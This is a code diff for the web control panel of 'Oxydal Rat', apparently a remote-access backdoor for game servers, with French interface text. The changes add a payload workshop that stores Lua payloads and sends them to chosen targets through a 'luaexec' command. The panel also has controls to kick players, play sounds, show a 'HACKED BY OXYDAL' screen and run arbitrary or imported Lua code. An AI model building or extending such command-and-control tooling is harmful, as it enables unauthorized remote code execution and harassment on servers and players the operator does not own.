@@ -68,7 +68,7 @@ def require_auth(f):
     wrapper.__name__ = f.__name__
     return wrapper
 
-# ==================== LOGIN ====================
+# ==================== LOGIN PAGE ====================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head><meta charset="UTF-8"><title>Oxydal Rat — Login</title>
@@ -133,7 +133,7 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ==================== PANEL HTML (CORRIGÉ) ====================
+# ==================== PANEL HTML (TOUT CORRIGÉ) ====================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -182,7 +182,7 @@ HTML = """<!DOCTYPE html>
     .modal.active{display:flex;}
     .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:600px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
     .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;}
-    input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;}
+    input,textarea{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
     .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
     .payload-item{cursor:pointer;padding:12px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:.2s;}
     .payload-item:hover{background:#334155;}
@@ -227,19 +227,29 @@ HTML = """<!DOCTYPE html>
 </div>
 
 <!-- Modals -->
-<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
-<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
-<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="HACKED BY OXYDAL" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
+<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick</h2><input type="text" id="kickReason" placeholder="Raison (optionnel)"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmKick">Kick</button></div></div></div>
+<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Sound</h2><input type="text" id="soundAssetId" placeholder="Asset ID"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmSound">Jouer</button></div></div></div>
+<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Text Screen</h2><input type="text" id="screenText" placeholder="Texte à afficher" value="HACKED BY OXYDAL"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmText">Afficher</button></div></div></div>
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Exécuter Lua</h2><textarea id="luaScript" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmLua">Exécuter</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Importer Fichier</h2><input type="file" id="luaFileInput" accept=".lua,.txt"><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="confirmImport">Exécuter</button></div></div></div>
-<div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Nouveau Payload</h2><input type="text" id="payloadName" placeholder="Nom"><textarea id="payloadCode" placeholder="Code Lua..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Annuler</button><button class="modal-btn confirm" id="savePayload">Sauvegarder</button></div></div></div>
 
-<!-- Modal Import Payload (CORRIGÉ) -->
+<!-- Modal Création/Édition Payload -->
+<div class="modal" id="payloadModal"><div class="modal-content">
+    <h2 id="payloadModalTitle">Nouveau Payload</h2>
+    <input type="text" id="payloadName" placeholder="Nom du payload">
+    <textarea id="payloadCode" placeholder="Code Lua..." style="height:250px;"></textarea>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Annuler</button>
+        <button class="modal-btn confirm" id="savePayload">Sauvegarder</button>
+    </div>
+</div></div>
+
+<!-- Modal Import Payload (100% fonctionnel) -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Importer Payload</h2>
-    <input type="text" id="payloadSearch" placeholder="Rechercher..." onkeyup="filterPayloads()">
+    <input type="text" id="payloadSearch" placeholder="Rechercher payload..." onkeyup="filterPayloads()">
     <div class="payload-list" id="payloadList"></div>
-    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir le code..." style="height:220px;"></textarea>
+    <textarea id="tempPayloadCode" placeholder="Sélectionne un payload pour voir/editer le code..." style="height:200px;"></textarea>
     <div class="modal-buttons">
         <button class="modal-btn cancel">Annuler</button>
         <button class="modal-btn confirm" id="executeTempPayload">Exécuter</button>
@@ -251,6 +261,7 @@ HTML = """<!DOCTYPE html>
 <script>
 const socket = io();
 let currentPlayerId = null;
+let editingPayloadName = null;
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(i => i.addEventListener('click', () => {
@@ -274,19 +285,79 @@ function filterPlayers() {
     });
 }
 
-// Modals
-function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
-function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
-function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
-function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
-function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
+// === WORKSHOP PAYLOADS ===
+function loadPayloads() {
+    fetch('/payload?action=list').then(r => r.json()).then(data => {
+        const list = document.getElementById('payloads-list');
+        list.innerHTML = Object.keys(data).length === 0 ? '<p style="color:#94a3b8;padding:20px;">Aucun payload</p>' : '';
+        for (const [name, code] of Object.entries(data)) {
+            const div = document.createElement('div');
+            div.style = 'background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';
+            div.innerHTML = `
+                <strong>${name}</strong><br>
+                <span style="font-size:0.8rem;color:#94a3b8">${code.substr(0,100)}${code.length>100?'...':''}</span>
+                <div style="margin-top:10px;">
+                    <button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name}')">Edit</button>
+                    <button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name}')">Suppr</button>
+                </div>`;
+            list.appendChild(div);
+        }
+    });
+}
+
+document.getElementById('newPayloadBtn').onclick = () => {
+    editingPayloadName = null;
+    document.getElementById('payloadModalTitle').textContent = 'Nouveau Payload';
+    document.getElementById('payloadName').value = '';
+    document.getElementById('payloadCode').value = '';
+    document.getElementById('payloadModal').classList.add('active');
+};
+
+window.editPayload = name => {
+    fetch(`/payload?action=get&name=${encodeURIComponent(name)}`).then(r => r.json()).then(d => {
+        editingPayloadName = name;
+        document.getElementById('payloadModalTitle').textContent = 'Modifier Payload';
+        document.getElementById('payloadName').value = name;
+        document.getElementById('payloadCode').value = d.code;
+        document.getElementById('payloadModal').classList.add('active');
+    });
+};
+
+window.deletePayload = name => {
+    if (confirm('Supprimer ' + name + ' ?')) {
+        fetch('/payload', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',name})})
+            .then(() => { toast('Payload supprimé'); loadPayloads(); });
+    }
+};
+
+document.getElementById('savePayload').onclick = () => {
+    const name = document.getElementById('payloadName').value.trim();
+    const code = document.getElementById('payloadCode').value.trim();
+    if (!name || !code) return toast('Nom + code requis');
+    fetch('/payload', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            action: editingPayloadName ? 'update' : 'create',
+            name: name,
+            code: code,
+            oldname: editingPayloadName
+        })
+    }).then(() => {
+        toast(editingPayloadName ? 'Payload modifié' : 'Payload créé');
+        document.getElementById('payloadModal').classList.remove('active');
+        loadPayloads();
+    });
+};
+
+// === IMPORT PAYLOAD (100% fonctionnel) ===
 function openPayloadSelector(id) {
     currentPlayerId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloadList");
         list.innerHTML = "";
         if (Object.keys(data).length === 0) {
-            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload</p>";
+            list.innerHTML = "<p style='color:#94a3b8;text-align:center;padding:20px;'>Aucun payload disponible</p>";
         } else {
             for (const name of Object.keys(data)) {
                 const item = document.createElement("div");
@@ -306,6 +377,27 @@ function openPayloadSelector(id) {
     });
 }
 
+function filterPayloads() {
+    const q = document.getElementById('payloadSearch').value.toLowerCase();
+    document.querySelectorAll('.payload-item').forEach(i => {
+        i.style.display = i.textContent.toLowerCase().includes(q) ? 'block' : 'none';
+    });
+}
+
+document.getElementById('executeTempPayload').onclick = () => {
+    const code = document.getElementById('tempPayloadCode').value.trim();
+    if (!code) return toast('Aucun code à exécuter');
+    sendTroll(currentPlayerId, 'luaexec', code);
+    document.getElementById('executePayloadModal').classList.remove('active');
+};
+
+// === MODALS CLASSIQUES ===
+function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
+function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
+function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
+function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
+function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
+
 document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener('click', () => b.closest('.modal').classList.remove('active')));
 
 function sendTroll(id, cmd, param = null) {
@@ -319,7 +411,6 @@ function sendTroll(id, cmd, param = null) {
     toast(cmd.toUpperCase() + ' envoyé');
 }
 
-// Actions modals
 document.getElementById('confirmKick').onclick = () => {
     const reason = document.getElementById('kickReason').value.trim() || 'Kicked';
     fetch('/kick', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userid: currentPlayerId, reason }) });
@@ -353,21 +444,7 @@ document.getElementById('confirmImport').onclick = () => {
     reader.readAsText(file);
 };
 
-document.getElementById('executeTempPayload').onclick = () => {
-    const code = document.getElementById('tempPayloadCode').value.trim();
-    if (!code) return toast('Aucun code');
-    sendTroll(currentPlayerId, 'luaexec', code);
-    document.getElementById('executePayloadModal').classList.remove('active');
-};
-
-function filterPayloads() {
-    const q = document.getElementById('payloadSearch').value.toLowerCase();
-    document.querySelectorAll('.payload-item').forEach(i => {
-        i.style.display = i.textContent.toLowerCase().includes(q) ? 'block' : 'none';
-    });
-}
-
-// Render
+// === RENDER ===
 function render(data) {
     document.getElementById('stats').innerText = data.online;
     const grid = document.getElementById('players');
@@ -513,11 +590,14 @@ def payload_manager():
     else:
         data = request.get_json() or {}
         action = data.get("action")
-        if action == "create": payloads[data["name"]] = data["code"]
-        elif action == "update":
-            if data.get("oldname") in payloads: del payloads[data["oldname"]]
+        if action == "create":
             payloads[data["name"]] = data["code"]
-        elif action == "delete": payloads.pop(data.get("name"), None)
+        elif action == "update":
+            if data.get("oldname") and data["oldname"] in payloads:
+                del payloads[data["oldname"]]
+            payloads[data["name"]] = data["code"]
+        elif action == "delete":
+            payloads.pop(data.get("name"), None)
         save_payloads()
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
